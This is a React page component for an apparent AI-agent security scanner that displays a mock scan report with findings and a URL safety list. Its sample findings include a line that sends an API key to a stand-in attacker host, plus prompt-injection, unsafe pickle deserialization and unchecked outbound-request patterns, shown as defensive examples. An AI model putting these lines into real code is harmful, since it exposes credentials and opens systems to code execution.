import { useParams, Link } from "react-router-dom";
import { ArrowLeft, Download, FileCode, Clock, AlertTriangle, ExternalLink, Lock } from "lucide-react";
import { Button } from "@/components/ui/button";
import AppLayout from "@/components/AppLayout";
import RiskGauge from "@/components/RiskGauge";

const mockResult = {
  id: "scan-1",
  name: "my-langchain-agent.zip",
  score: 78,
  filesScanned: 24,
  linesScanned: 1482,
  findingsCount: 5,
  duration: "12s",
  framework: "LangChain",
  findings: [
    { severity: "HIGH", file: "agent.py", line: 142, desc: "Unauthorized API access — agent calls external endpoint without allowlist check", code: "requests.post(user_input_url, data=sensitive_payload)" },
    { severity: "HIGH", file: "handler.py", line: 89, desc: "Prompt injection vector — raw user input passed to system prompt", code: "system_prompt = f\"You are {user_role}. {user_input}\"" },
    { severity: "HIGH", file: "plugin.py", line: 23, desc: "Data exfiltration risk — credentials sent to external URL", code: "urllib.request.urlopen(f'http://exfil.evil.corp/collect?key={api_key}')" },
    { severity: "MEDIUM", file: "utils.py", line: 56, desc: "Insecure deserialization — pickle.loads on untrusted data", code: "data = pickle.loads(user_uploaded_file.read())" },
    { severity: "LOW", file: "config.py", line: 12, desc: "Hardcoded API key detected", code: "OPENAI_KEY = 'sk-proj-abc123...'" },
  ],
  urls: [
    { url: "http://exfil.evil.corp/collect", status: "unsafe" as const },
    { url: "https://api.openai.com/v1/chat/completions", status: "safe" as const },
    { url: "http://suspicious-domain.xyz/callback", status: "unsafe" as const },
  ],
};

const severityColor: Record<string, string> = {
  HIGH: "bg-danger/10 text-danger border-danger/20",
  MEDIUM: "bg-caution/10 text-caution border-caution/20",
  LOW: "bg-muted text-muted-foreground border-border",
};

const ScanResult = () => {
  const { id } = useParams();

  return (
    <AppLayout>
      <div className="max-w-4xl">
        <Link to="/dashboard" className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors mb-6">
          <ArrowLeft className="w-4 h-4" />
          Back to Dashboard
        </Link>

        <div className="flex items-start justify-between mb-8">
          <div>
            <h1 className="text-2xl font-bold mb-1">{mockResult.name}</h1>
            <p className="text-sm text-muted-foreground font-mono-data">{mockResult.framework} · Scan ID: {id}</p>
          </div>
          <Button variant="outline" disabled className="gap-2 relative group">
            <Download className="w-4 h-4" />
            Download PDF
            <Lock className="w-3 h-3" />
            <span className="absolute -top-8 right-0 text-xs bg-accent px-2 py-0.5 rounded-[4px] text-accent-foreground opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap">
              Pro+ only
            </span>
          </Button>
        </div>

        {/* Risk Gauge + Stats */}
        <div className="grid md:grid-cols-[auto_1fr] gap-8 mb-8">
          <div className="border border-border rounded-[4px] bg-surface p-8 shadow-hard flex justify-center">
            <RiskGauge score={mockResult.score} />
          </div>
          <div className="grid grid-cols-2 gap-4">
            {[
              { label: "Files Scanned", value: mockResult.filesScanned, icon: FileCode },
              { label: "Lines Scanned", value: mockResult.linesScanned.toLocaleString(), icon: FileCode },
              { label: "Findings", value: mockResult.findingsCount, icon: AlertTriangle },
              { label: "Scan Duration", value: mockResult.duration, icon: Clock },
            ].map((stat) => (
              <div key={stat.label} className="border border-border rounded-[4px] bg-surface p-4 shadow-hard">
                <div className="flex items-center gap-2 text-muted-foreground mb-1">
                  <stat.icon className="w-4 h-4" />
                  <span className="text-xs">{stat.label}</span>
                </div>
                <span className="text-xl font-bold font-mono-data">{stat.value}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Findings Table */}
        <div className="border border-border rounded-[4px] bg-surface shadow-hard overflow-hidden mb-8">
          <div className="px-4 py-3 border-b border-border">
            <h2 className="text-sm font-semibold">Findings</h2>
          </div>
          <div className="divide-y divide-border">
            {mockResult.findings.map((f, i) => (
              <div key={i} className="p-4">
                <div className="flex items-center gap-3 mb-2">
                  <span className={`text-xs font-bold font-mono-data px-2 py-0.5 rounded-[4px] border ${severityColor[f.severity]}`}>
                    {f.severity}
                  </span>
                  <span className="text-sm font-mono-data text-muted-foreground">
                    {f.file}:{f.line}
                  </span>
                </div>
                <p className="text-sm mb-3">{f.desc}</p>
                <div className="bg-[#010409] border border-border rounded-[4px] p-3 font-mono-data text-xs overflow-x-auto">
                  <div className={`${f.severity === "HIGH" ? "bg-danger/10 border-l-2 border-danger" : ""} px-2 py-1`}>
                    <span className="text-muted-foreground mr-3">{f.line}</span>
                    <span className="text-foreground">{f.code}</span>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* URL Analysis */}
        <div className="border border-border rounded-[4px] bg-surface shadow-hard overflow-hidden">
          <div className="px-4 py-3 border-b border-border">
            <h2 className="text-sm font-semibold">URL Analysis</h2>
          </div>
          <div className="divide-y divide-border">
            {mockResult.urls.map((u, i) => (
              <div key={i} className="px-4 py-3 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <ExternalLink className="w-4 h-4 text-muted-foreground" />
                  <span className="text-sm font-mono-data">{u.url}</span>
                </div>
                <span className={`text-xs font-bold font-mono-data px-2 py-0.5 rounded-[4px] ${
                  u.status === "safe" ? "bg-safe/10 text-safe" : "bg-danger/10 text-danger"
                }`}>
                  {u.status.toUpperCase()}
                </span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </AppLayout>
  );
};

export default ScanResult;
